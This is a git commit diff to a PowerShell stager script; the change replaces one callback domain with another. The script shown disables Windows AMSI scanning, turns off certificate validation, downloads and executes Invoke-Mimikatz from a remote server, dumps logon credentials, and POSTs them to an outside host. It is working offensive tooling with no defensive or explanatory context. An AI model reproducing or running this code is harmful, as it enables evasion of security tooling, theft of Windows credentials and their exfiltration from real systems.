c6da25e5b8fabfbad3ec0e47702586ecef41fca3
Ryan Monaghan <rynmon@pm.me>
2024-09-09 01:24:40 +0100

    Update stager.ps1

--- stager.ps1
+++ stager.ps1
@@ -3,9 +3,9 @@ try{
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
 }catch{}
 [Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
-IEX (New-Object Net.WebClient).DownloadString('https://ryanssupersecretdomain.com:443/Invoke-Mimikatz.ps1')
+IEX (New-Object Net.WebClient).DownloadString('https://rynmon.ie:443/Invoke-Mimikatz.ps1')
 $cmd = Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'
-$request = [System.Net.WebRequest]::Create('https://ryanssupersecretdomain.com:443/')
+$request = [System.Net.WebRequest]::Create('https://rynmon.ie:443/')
 $request.Method = 'POST'
 $request.ContentType = 'application/x-www-form-urlencoded'
 $bytes = [System.Text.Encoding]::ASCII.GetBytes($cmd)
